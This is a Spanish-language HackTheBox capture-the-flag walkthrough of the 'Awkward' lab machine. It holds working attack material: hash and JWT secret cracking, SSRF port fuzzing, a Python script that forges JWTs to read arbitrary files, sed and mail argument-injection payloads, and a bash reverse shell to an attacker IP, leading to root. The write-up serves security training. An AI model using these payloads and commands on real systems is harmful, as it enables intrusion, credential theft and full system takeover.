---
title: Awkward - HackTheBox
categories: [ Linux ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Awkward/Awkward.jpg">

Buenas! El día de hoy completaremos la máquina [Awkward](https://app.hackthebox.com/machines/Awkward) de [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos: 

- Server Side Request Forgery (SSRF)
- LFI aprovechandonos de JWT
- Port Discovery con SSRF
- Y nos aprovecharemos de una tarea cron para conseguir una shell!

## Reconocimiento

Comenzaremos con el clásico escaneo de nmap 

```plaintext
❯ nmap 10.10.11.185
Nmap scan report for 10.10.11.185
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Con curl nos damos cuenta que la web nos redirige al dominio `hat-valley.htb`

```plaintext
❯ curl 10.10.11.185
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="0; url='http://hat-valley.htb**'" />
</head>
<body>
</body>
</html>
```

Añadimos el dominio al `/etc/hosts`

```shell
echo "10.10.11.185 hat-valley.htb" | sudo tee -a /etc/hosts
```

Fijandonos en el código fuente nos damos cuenta de un app.js

![](/assets/img/HTB/Awkward/app.js.png)

Desde curl, y aplicando unas expresiones regulares, podemos encontrar rutas de la web

```shell
❯ curl -s http://hat-valley.htb/js/app.js | grep routes | sed 's/path:/\n/g' | grep '\ \\"\/' | awk '{print $2}' FS='"' | tr -d \\
/
/hr
/dashboard
/leave
```

Podemos ver /hr, donde hay una página de login

![](/assets/img/HTB/Awkward/hr.png)

Siguiendo aplicando expresiones regulares en el archivo .js, encontramos más rutas para la api

```shell
❯ curl -s http://hat-valley.htb/js/app.js | sed 's/baseURL + /\n/g' | grep "return response" | awk '{print $2}' FS="'" 
all-leave
submit-leave
login
staff-details
store-status
```

Viendo las demás rutas, no hay nada irrelevante, el directorio staff-details tiene hashes y usuarios.

```shell
❯ curl -s http://hat-valley.htb/api/staff-details | jq
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

Usando john encontramos la contraseña de christopher.jones

## Explotación 

```shell
❯ cat hashes
christine.wool:6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649
christopher.jones:e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1
jackson.lightheart:b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436
bean.hill:37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f

❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-SHA256
Using default input encoding: UTF-8
Will run 12 OpenMP threads
chris123         (christopher.jones)     
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

Ahora usando las credenciales nos podemos loguear a /hr

![](/assets/img/HTB/Awkward/dashboard.png)

En la página hay un botón `refresh`, pero al darle no hace nada

![](/assets/img/HTB/Awkward/refresh.png)

Si interceptamos la petición con BurpSuite podemos ver que apunta a un recurso web con el parámetro `url`

![](/assets/img/HTB/Awkward/burp.png)

Ahora nos podemos aprovechar de un SSRF para apuntar a puertos locales de la propia máquina y fuzzearlos

```shell
❯ wfuzz -c --hh=0 -t 200 -z range,1-10000 -u 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ"
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000080:   200        8 L      13 W       132 Ch      "80"                                                                                                                   
000003002:   200        685 L    5834 W     77002 Ch    "3002"                                                                                                                 
000008080:   200        54 L     163 W      2881 Ch     "8080"  
```

Vemos el puerto 3002, al visitarlo (por el SSRF), podemos ver la documentación de la API

![](/assets/img/HTB/Awkward/api.png)

Podemos ver que hace una petición a /all-leave ejecuta el comando `awk` con parámetros

![](/assets/img/HTB/Awkward/badinuser.png)

Nos podemos aprovechar de la variable user, para incluir archivos locales de la siguiente manera

La API ejecuta este comando

```shell
awk '/" + user + "/' /var/www/private/leave_requests.csv    

Si cambiamos la cookie el usuario por `/etc/passwd` se ejecutaría el siguiente comando

```shell
awk '//' /etc/passwd ` /' /var/www/private/leave_requests.csv
```

Para esto necesitamos el secreto de la cookie, podemos usar [jwt2john.py](https://github.com/Sjord/jwtcrack)

```shell
❯ ./jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc2ODI0OTYxfQ.jL39oYkjlbF1Cy4LWBCzgMkh_ZByJuVFicNfflHMEao > hash

❯ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
123beany123      (?)     
Session completed. 
```

En [jwt.io](https://jwt.io) podemos modificar la cookie cambiando el username por `/etc/passwd`

![](/assets/img/HTB/Awkward/cookie.png)

Nos genera la siguiente cookie, que tenemos que cambiar para hacer una petición contra /api/all-leave

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii9gIC9ldGMvcGFzc3dkIGAiLCJpYXQiOjE2NzY4MjQ5NjF9.0mTFZ_3Yyg_fnV4ZPZcneB0sh1PgNvefZPxX5jhh9_M
```

![](/assets/img/HTB/Awkward/all-leave.png)

Se nos descarga un archivo all-leave el cual contiene el contenido del archivo seleccionado

```shell
❯ cat all-leave | grep sh$
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

Para automatizar el LFI, podemos crear este script

```python
#!/usr/bin/python3
import jwt, requests, sys

if len(sys.argv) < 2:
   print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <archivo>\n")
   print("[\033[1;34m*\033[1;37m] Para descargar archivos puede usar -d\n")
   exit(1)

file = sys.argv[1]

def generateJWT(file: str) -> str:
    payload = { "username": "/' {} '/".format(file), "iat": 1666898953 }
    secret = "123beany123"
    token = jwt.encode(payload, secret)
    return token

token = generateJWT(file)
target = "http://hat-valley.htb/api/all-leave"
cookies = {"token":token}
request = requests.get(target, cookies=cookies)

try:
    if sys.argv[2] == '-d':
        with open(file.split("/")[-1].strip(),'wb') as f:
            f.write(request.content)

except:
    if request.text == "Failed to retrieve leave requests":
        print("\n[\033[1;31m-\033[1;37m] Archivo no encontrado\n")
        exit(1)
    else:
        print(request.text.strip())
```

Al ver el archivo `passwd`, nos percatamos en el usuario bean, investigaremos su `.bashrc`

```shell
❯ python3 lfi.py /home/bean/.bashrc | grep alias | grep -vE "^\s|^$|^#"
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
if [ -f ~/.bash_aliases ]; then
```

Vemos un alias con una ruta a un script en bash, vamos a echarle un vistazo

```shell
❯ python3 lfi.py /home/bean/Documents/backup_home.sh                   
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

En la penúltima linea encontramos un archivo tar.gz, procederemos a descargarlo con -d 

```shell
❯ python3 lfi.py /home/bean/Documents/backup/bean_backup_final.tar.gz -d

❯ ls
bean_backup_final.tar.gz  lfi.py
```

Descomprimimos un archivo y nos queda otro comprimido y un txt

```shell
❯ tar -xf bean_backup_final.tar.gz 

❯ ls
bean_backup.tar.gz  bean_backup_final.tar.gz  time.txt  lfi.py
```

Dentro de un archivo en .config encontramos las credenciales de bean

```shell
❯ cat .config/xpad/content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

bean.hill
014mrbeanrules!#P
```

Nos conectamos por SSH y tenemos la primera flag

```shell
❯ ssh bean@10.10.11.185
bean@10.10.11.185's password: 014mrbeanrules!#P
bean@awkward:~$ id
uid=1001(bean) gid=1001(bean) groups=1001(bean)
bean@awkward:~$ hostname -I
10.10.11.185 dead:beef::250:56ff:feb9:4420 
bean@awkward:~$ cat user.txt 
512**************************513
bean@awkward:~$
```

Ahora, podemos encontrar otros subdominios

```shell
❯ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u hat-valley.htb -t 200
===============================================================
[+] Url:          http://hat-valley.htb
[+] Threads:      200
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.hat-valley.htb (Status: 401) [Size: 188]
```

Al intentar entrar nos pide credenciales, por suerte la contraseña de bean funciona para admin

![](/assets/img/HTB/Awkward/pagina.png)

Leyendo archivos php en store, encontramos que ejecuta el comando `sed` y unos argumentos que podemos usar para explotar ya que el item_id es algo que podemos controlar

```shell
bean@awkward:/var/www/store$ cat cart_actions.php  | grep sed
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
bean@awkward:/var/www/store$
```

Para eso vamos a shop y agregamos cualquier cosa al carrito

![](/assets/img/HTB/Awkward/pagina1.png)

En el directorio `cart` de la web se crea un archivo que contiene los datos

```shell
bean@awkward:/var/www/store/cart$ ls
dasf-1242-412-ae41
bean@awkward:/var/www/store/cart$ cat dasf-1242-412-ae41
***Hat Valley Cart***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
bean@awkward:/var/www/store/cart$
```

Primero crearemos un archivo `reverse.sh` en `/tmp` que nos ejecute una reverse shell

```shell
bean@awkward:/tmp$ cat reverse.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.143/443 0>&1
bean@awkward:/tmp$ chmod +x reverse.sh
bean@awkward:/tmp$
```

Necesitaremos editar el archivo que se creó, pero no tenemos permisos de escritura así que haremos una copia, lo borramos y renombraremos

```shell
bean@awkward:/var/www/store/cart$ cp dasf-1242-412-ae41 back
bean@awkward:/var/www/store/cart$ rm -f dasf-1242-412-ae41
bean@awkward:/var/www/store/cart$ cp back dasf-1242-412-ae41
bean@awkward:/var/www/store/cart$
```

Ahora modificamos para que el `sed` nos ejecute la reverse shell

```shell
bean@awkward:/var/www/store/cart$ cat dasf-1242-412-ae41
***Hat Valley Cart***
item_id=1' -e "1e /tmp/reverse.sh" /tmp/reverse.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
bean@awkward:/var/www/store/cart
```

En la web vamos al carrito y eliminamos el item, pero vamos a interceptarlo con BurpSuite

![](/assets/img/HTB/Awkward/pagina2.png)

Agregamos a la petición lo mismo que al archivo pero convertimos el espacio a +

![](/assets/img/HTB/Awkward/burpsuite.png)

Al darle a `forward`, se ejecuta el script y recibimos la reverse shell

```shell
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.185
www-data@awkward:~/store$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@awkward:~/store$ hostname -I
10.10.11.185 dead:beef::250:56ff:feb9:8ab1 
www-data@awkward:~/store$
```

## Escalada de Privilegios

En la ruta `/var/www/private` podemos ver algo que parece ser argumentos de un mail

```shell
www-data@awkward:~/private$ cat leave_requests.csv 
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
www-data@awkward:~/private$
```

Con [PSPY](https://github.com/DominicBreuker/pspy) podemos encontrar que el usuario `root` ejecuta alguno de ellos

```shell
CMD: UID=0    PID=7481   | mail -s Leave Request: bean.hill christine
```

[GTFOBins](https://gtfobins.github.io/gtfobins/mail/) nos da una vía de ejecutar scripts o binarios con el comando `mail`

Aprovechando el `reverse.sh` que tenemos en `/tmp` agregamos una línea que lo ejecute el archivo `mail`

```shell
www-data@awkward:~/private$ echo '" --exec="\!/tmp/rev.sh"' >> leave_requests.csv
www-data@awkward:~/private$
```

Después de unos segundos podemos ver como se ejecuta y nos llega la shell como `root`

```shell
❯ nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.185
root@awkward:~/scripts# id
uid=0(root) gid=0(root) groups=0(root)
root@awkward:~/scripts# hostname -I
10.10.11.185 dead:beef::250:56ff:feb9:8ab1 
root@awkward:~/scripts# cat /root/root.txt 
f23**************************679
root@awkward:~/scripts#
```

